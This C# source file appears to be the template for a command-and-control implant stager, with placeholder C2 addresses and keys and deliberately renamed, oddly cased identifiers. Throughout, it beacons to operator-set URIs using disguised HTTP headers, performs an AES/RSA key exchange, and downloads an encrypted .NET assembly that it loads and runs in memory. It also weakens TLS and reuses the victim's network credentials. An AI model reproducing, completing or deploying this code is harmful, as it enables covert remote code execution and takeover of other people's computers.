using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace GrawlStager
{
    public class GrawlStager
    {
        public GrawlStager()
        {
            ExecLevel();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GrawlStager();
        }
        public static void Execute()
        {
            new GrawlStager();
        }
        public void ExecLevel()
        {
            try
            {
                List<string> RedWolfURIs = @"{{REP_REDWOLF_URIS}}".Split(',').ToList();
                string RedWolfCertHash = @"{{REP_REDWOLF_CERT_HASH}}";
				List<string> ProfHTTPHeaderNames = @"{{REP_PROF_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
				List<string> ProfHTTPHeaderValues = @"{{REP_PROF_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
				List<string> ProfHTTPUrls = @"{{REP_PROF_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
				string ProfHTTPPostRequest = @"{{REP_PROF_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string ProfHTTPPostResponse = @"{{REP_PROF_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValCerT = bool.Parse(@"{{REP_VAL_CERT}}");
                bool UsCertPin = bool.Parse(@"{{REP_USE_CERT_PINNING}}");

                Random random = new Random();
                string aANOTHERID = @"{{REP_GRAWL_ANOTHERID}}";
                string ANOTHERID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REP_GRAWL_SHARED_SECRET_PASSWORD}}");
                string MessageFormat = @"{{""ANOTHERID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncMsg"":""{4}"",""HMAC"":""{5}""}}";

                Aes InstallAESKey = Aes.Create();
                InstallAESKey.Mode = CipherMode.CBC;
                InstallAESKey.Padding = PaddingMode.PKCS7;
                InstallAESKey.Key = SetupKeyBytes;
                InstallAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncryptedRSAPublicKey = InstallAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                string FirstBody = String.Format(MessageFormat, aANOTHERID + ANOTHERID, "0", "", Convert.ToBase64String(InstallAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                {
                    bool valid = true;
                    if (UsCertPin && RedWolfCertHash != "")
                    {
                        valid = cert.GetCertHashString() == RedWolfCertHash;
                    }
                    if (valid && ValCerT)
                    {
                        valid = errors == System.Net.Security.SslPolicyErrors.None;
                    }
                    return valid;
                };
                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(FirstBody));
                GrawlsWebClient wc = null;
                string FirstResponse = "";
                wc = new GrawlsWebClient();
                wc.UseDefaultCredentials = true;
                wc.Proxy = WebRequest.DefaultWebProxy;
                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                string RedWolfURI = "";
                foreach (string uri in RedWolfURIs)
                {
                    try
                    {
                        for (int i = 0; i < ProfHTTPHeaderValues.Count; i++)
                        {
                            if (ProfHTTPHeaderNames[i] == "Cookie")
                            {
                                wc.SetCookies(new Uri(uri), ProfHTTPHeaderValues[i].Replace(";", ",").Replace("{ANOTHERID}", ""));
                            }
                            else
                            {
                                wc.Headers.Set(ProfHTTPHeaderNames[i].Replace("{ANOTHERID}", ""), ProfHTTPHeaderValues[i].Replace("{ANOTHERID}", ""));
                            }
                        }
                        wc.DownloadString(uri + ProfHTTPUrls[random.Next(ProfHTTPUrls.Count)].Replace("{ANOTHERID}", ""));
                        RedWolfURI = uri;
                    }
                    catch
                    {
                        continue;
                    }
                }
                for (int i = 0; i < ProfHTTPHeaderValues.Count; i++)
                {
                    if (ProfHTTPHeaderNames[i] == "Cookie")
                    {
                        wc.SetCookies(new Uri(RedWolfURI), ProfHTTPHeaderValues[i].Replace(";", ",").Replace("{ANOTHERID}", ANOTHERID));
                    }
                    else
                    {
                        wc.Headers.Set(ProfHTTPHeaderNames[i].Replace("{ANOTHERID}", ANOTHERID), ProfHTTPHeaderValues[i].Replace("{ANOTHERID}", ANOTHERID));
                    }
                }
                FirstResponse = wc.UploadString(RedWolfURI + ProfHTTPUrls[random.Next(ProfHTTPUrls.Count)].Replace("{ANOTHERID}", ANOTHERID), String.Format(ProfHTTPPostRequest, transformedResponse));
                string extracted = Parse(FirstResponse, ProfHTTPPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                List<string> parsed = Parse(extracted, MessageFormat);
                string iv64str = parsed[3];
                string messAgE64str = parsed[4];
                string hash64str = parsed[5];
                byte[] messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                InstallAESKey.IV = Convert.FromBase64String(iv64str);
                byte[] Partdecrypted = InstallAESKey.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                byte[] Fulldecrypted = rsa.Decrypt(Partdecrypted, true);

                Aes SessKEy = Aes.Create();
                SessKEy.Mode = CipherMode.CBC;
                SessKEy.Padding = PaddingMode.PKCS7;
                SessKEy.Key = Fulldecrypted;
                SessKEy.GenerateIV();
                hmac = new HMACSHA256(SessKEy.Key);
                byte[] challenge1 = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(challenge1);
                byte[] EncChallEnge1 = SessKEy.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                hash = hmac.ComputeHash(EncChallEnge1);

                string SeccondBody = String.Format(MessageFormat, ANOTHERID, "1", "", Convert.ToBase64String(SessKEy.IV), Convert.ToBase64String(EncChallEnge1), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(SeccondBody));

                string SeccondResponse = "";
                for (int i = 0; i < ProfHTTPHeaderValues.Count; i++)
                {
                    if (ProfHTTPHeaderNames[i] == "Cookie")
                    {
                        wc.SetCookies(new Uri(RedWolfURI), ProfHTTPHeaderValues[i].Replace(";", ",").Replace("{ANOTHERID}", ANOTHERID));
                    }
                    else
                    {
                        wc.Headers.Set(ProfHTTPHeaderNames[i].Replace("{ANOTHERID}", ANOTHERID), ProfHTTPHeaderValues[i].Replace("{ANOTHERID}", ANOTHERID));
                    }
                }
                SeccondResponse = wc.UploadString(RedWolfURI + ProfHTTPUrls[random.Next(ProfHTTPUrls.Count)].Replace("{ANOTHERID}", ANOTHERID), String.Format(ProfHTTPPostRequest, transformedResponse));
                extracted = Parse(SeccondResponse, ProfHTTPPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                messAgE64str = parsed[4];
                hash64str = parsed[5];
                messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                SessKEy.IV = Convert.FromBase64String(iv64str);

                byte[] DecryptChallEnges = SessKEy.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                byte[] challenge1Test = new byte[4];
                byte[] challenge2 = new byte[4];
                Buffer.BlockCopy(DecryptChallEnges, 0, challenge1Test, 0, 4);
                Buffer.BlockCopy(DecryptChallEnges, 4, challenge2, 0, 4);
                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                SessKEy.GenerateIV();
                byte[] EncChallEnge2 = SessKEy.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                hash = hmac.ComputeHash(EncChallEnge2);

                string ThirdBody = String.Format(MessageFormat, ANOTHERID, "2", "", Convert.ToBase64String(SessKEy.IV), Convert.ToBase64String(EncChallEnge2), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(ThirdBody));

                string ThirdResponse = "";
                for (int i = 0; i < ProfHTTPHeaderValues.Count; i++)
                {
                    if (ProfHTTPHeaderNames[i] == "Cookie")
                    {
                        wc.SetCookies(new Uri(RedWolfURI), ProfHTTPHeaderValues[i].Replace(";", ",").Replace("{ANOTHERID}", ANOTHERID));
                    }
                    else
                    {
                        wc.Headers.Set(ProfHTTPHeaderNames[i].Replace("{ANOTHERID}", ANOTHERID), ProfHTTPHeaderValues[i].Replace("{ANOTHERID}", ANOTHERID));
                    }
                }
                ThirdResponse = wc.UploadString(RedWolfURI + ProfHTTPUrls[random.Next(ProfHTTPUrls.Count)].Replace("{ANOTHERID}", ANOTHERID), String.Format(ProfHTTPPostRequest, transformedResponse));
                extracted = Parse(ThirdResponse, ProfHTTPPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                messAgE64str = parsed[4];
                hash64str = parsed[5];
                messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                SessKEy.IV = Convert.FromBase64String(iv64str);
                byte[] DecryptedAssembly = SessKEy.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                Assembly grawlAssembly = Assembly.Load(DecryptedAssembly);
                grawlAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { RedWolfURI, RedWolfCertHash, ANOTHERID, SessKEy });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
        }

        public class GrawlsWebClient : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public GrawlsWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }
            public void SetCookies(Uri uri, string cookies)
            {
                this.CookieContainer.SetCookies(uri, cookies);
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address) as HttpWebRequest;
                if (request == null) return base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'grp0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'grp1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'grp2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'grp3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'grp4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'grp5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["grp0"] != null) { matches.Add(match.Groups["grp0"].Value); }
            if (match.Groups["grp1"] != null) { matches.Add(match.Groups["grp1"].Value); }
            if (match.Groups["grp2"] != null) { matches.Add(match.Groups["grp2"].Value); }
            if (match.Groups["grp3"] != null) { matches.Add(match.Groups["grp3"].Value); }
            if (match.Groups["grp4"] != null) { matches.Add(match.Groups["grp4"].Value); }
            if (match.Groups["grp5"] != null) { matches.Add(match.Groups["grp5"].Value); }
            return matches;
        }

        // {{REP_PROF_MESSAGE_TRANSFORM}}
    }
}